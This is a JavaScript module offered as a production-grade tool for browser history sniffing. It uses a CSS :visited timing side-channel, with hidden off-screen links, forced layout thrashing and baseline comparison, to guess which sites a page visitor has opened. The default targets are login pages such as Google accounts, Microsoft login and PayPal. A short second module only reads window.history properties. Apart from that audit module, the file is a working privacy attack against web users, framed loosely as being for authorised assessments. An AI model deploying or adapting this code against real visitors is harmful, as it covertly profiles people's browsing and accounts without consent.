/**
 * history_sniff.js — Production‑grade Browser History Sniffing & History API Audit
 *
 * This module provides:
 *   1. `sniffVisitedURLs()` – attempts to determine if a list of URLs are in
 *      the browser's visited history using CSS :visited timing side‑channels.
 *      Modern browsers have heavily mitigated this attack, but it remains
 *      effective in some environments (e.g., legacy browsers, embedded views,
 *      or with certain `:visited`‑induced paint/layout timing differences).
 *      The function returns a probabilistic result for each URL.
 *
 *   2. Default export – a Pinpoint‑compatible `History_API_Audit` that checks
 *      `window.history` length, pushState/replaceState availability, and
 *      scroll restoration support.
 *
 * Designed exclusively for authorised security assessments.
 */

// ---------------------------------------------------------------------------
// 1. :visited timing side‑channel engine
// ---------------------------------------------------------------------------

/**
 * Default list of URLs to test if none provided. These are typical sites a
 * target might have visited. Adjust as needed for the engagement.
 */
const DEFAULT_TEST_URLS = [
    'https://accounts.google.com',
    'https://login.live.com',
    'https://github.com',
    'https://facebook.com',
    'https://twitter.com',
    'https://amazon.com',
    'https://paypal.com',
    'https://reddit.com',
    'https://stackoverflow.com',
];

/**
 * Performs a single timing measurement for one URL.
 * The technique relies on the fact that the browser might spend a slightly
 * different amount of time rendering an element with a :visited pseudo‑class
 * style change. We force a style recalculation and measure the duration using
 * a high‑resolution timer (performance.now() or requestAnimationFrame loop).
 *
 * Because `getComputedStyle()` lies about :visited colors to prevent trivial
 * leaks, we instead measure the time it takes to perform a forced layout after
 * applying a heavy :visited style.
 *
 * @param {string} url – URL to test.
 * @returns {Promise<number>} – timing delta in milliseconds (noisy).
 */
async function measureLinkTiming(url) {
    return new Promise((resolve) => {
        // Create a hidden link element
        const link = document.createElement('a');
        link.href = url;
        link.textContent = 'test';
        link.style.position = 'absolute';
        link.style.left = '-9999px';
        link.style.top = '-9999px';
        link.style.fontSize = '20px';
        link.style.fontFamily = 'sans-serif';
        // Heavy style on :visited – this can cause a different compositing layer or
        // texture cache behaviour in some rendering engines.
        const styleId = `visited_sniff_${Date.now()}_${Math.random().toString(36).slice(2)}`;
        link.classList.add(styleId);

        const style = document.createElement('style');
        style.textContent = `
      .${styleId}:visited {
        color: rgb(1,2,3) !important;        /* change text color */
        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="%23000001"/></svg>') !important;
        outline: 2px solid rgb(4,5,6) !important;
        text-decoration: underline overline !important;
        filter: blur(0.001px) !important;
        opacity: 0.999 !important;
      }
    `;

        document.head.appendChild(style);
        document.body.appendChild(link);

        // Force layout and start timing
        link.offsetHeight; // force style recalc

        const start = performance.now();
        // Repeatedly trigger style recalc & layout thrashing to amplify any difference
        for (let i = 0; i < 50; i++) {
            link.style.opacity = (i % 2 === 0) ? '0.999' : '0.998';  // trigger repaint
            void link.offsetHeight;                                     // force layout
        }
        const end = performance.now();
        const delta = end - start;

        // Cleanup
        style.remove();
        link.remove();

        resolve(delta);
    });
}

/**
 * Runs multiple trials for a single URL and returns the median timing,
 * attempting to reduce noise.
 *
 * @param {string} url
 * @param {number} trials – number of measurements (default 5)
 * @returns {Promise<number>}
 */
async function medianTiming(url, trials = 5) {
    const timings = [];
    for (let i = 0; i < trials; i++) {
        timings.push(await measureLinkTiming(url));
        // Small delay between trials to let browser settle
        await new Promise(r => setTimeout(r, 20));
    }
    timings.sort((a, b) => a - b);
    const median = timings[Math.floor(timings.length / 2)];
    return median;
}

/**
 * Computes a simple threshold based on a known‑unvisited baseline URL.
 * We assume `baselineUrl` has never been visited (e.g., a random unique URL).
 * If the target timing is significantly higher than the baseline, we flag as
 * possibly visited.
 *
 * @param {number[]} baselineTimings – array of timings for unvisited baseline URLs.
 * @param {number} targetTiming – timing for the test URL.
 * @param {number} [thresholdMultiplier=1.5] – multiplier over median baseline.
 * @returns {{ visited: boolean, confidence: number }}
 */
function evaluateTiming(baselineTimings, targetTiming, thresholdMultiplier = 1.5) {
    if (baselineTimings.length === 0) return { visited: false, confidence: 0 };

    const sorted = [...baselineTimings].sort((a, b) => a - b);
    const baselineMedian = sorted[Math.floor(sorted.length / 2)];
    // Use median absolute deviation to scale the threshold
    const deviations = sorted.map(v => Math.abs(v - baselineMedian));
    const mad = deviations.sort((a, b) => a - b)[Math.floor(deviations.length / 2)];
    const threshold = baselineMedian + Math.max(mad * thresholdMultiplier, 2); // at least 2ms

    const visited = targetTiming > threshold;
    // Confidence roughly proportional to how far beyond the threshold it is
    const excess = Math.max(0, targetTiming - threshold);
    const confidence = Math.min(1, excess / (threshold + 1));
    return { visited, confidence: Math.round(confidence * 100) / 100 };
}

/**
 * Main interface: test a list of URLs against the user's history.
 *
 * **Important caveats:**
 * - Modern browsers (Chrome 86+, Firefox 86+, Safari 13+) have implemented
 *   strict `:visited` partitioning, making timing side‑channels extremely
 *   unreliable. This function may return many false negatives.
 * - Results are probabilistic and should be treated as indicators, not facts.
 *
 * @param {Object} [options={}]
 * @param {string[]} [options.urls=DEFAULT_TEST_URLS] – array of URLs to test.
 * @param {number} [options.trials=5] – number of measurements per URL.
 * @param {number} [options.thresholdMultiplier=1.5] – sensitivity.
 * @returns {Promise<Object>} – object mapping each URL to { visited, confidence, timing, baselineMedian }
 */
export async function sniffVisitedURLs(options = {}) {
    const {
        urls = DEFAULT_TEST_URLS,
        trials = 5,
        thresholdMultiplier = 1.5,
    } = options;

    // Generate a list of never‑visited baseline URLs (random unique strings)
    const baselineUrls = [];
    for (let i = 0; i < 3; i++) {
        baselineUrls.push(`https://never-visited-${Date.now()}-${Math.random().toString(36)}.example.com`);
    }

    // Collect baseline timings
    const baselineTimings = [];
    for (const url of baselineUrls) {
        const med = await medianTiming(url, trials);
        baselineTimings.push(med);
    }

    // Test candidate URLs
    const results = {};
    for (const url of urls) {
        const timing = await medianTiming(url, trials);
        const evaluation = evaluateTiming(baselineTimings, timing, thresholdMultiplier);
        results[url] = {
            visited: evaluation.visited,
            confidence: evaluation.confidence,
            timingMedian: Math.round(timing * 100) / 100,
            baselineMedian: Math.round(baselineTimings.sort((a, b) => a - b)[Math.floor(baselineTimings.length / 2)] * 100) / 100,
        };
    }

    return results;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible History API Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'history_sniff',
    title: 'History_API_Audit',
    level: 3,
    info: 'Audits window.history stack length and pushState/replaceState feature support.',
    steps: [
        'Check window.history.length.',
        'Inspect pushState availability.',
    ],
    run: async () => {
        const history = window.history;
        const supported = typeof history !== 'undefined' && typeof history.pushState === 'function';
        return {
            historySupported: supported,
            historyLength: history ? history.length : 0,
            scrollRestorationSupported: history && 'scrollRestoration' in history,
            pushStateAvailable: supported,
            replaceStateAvailable: typeof history?.replaceState === 'function',
        };
    },
};

export default pinpointModule;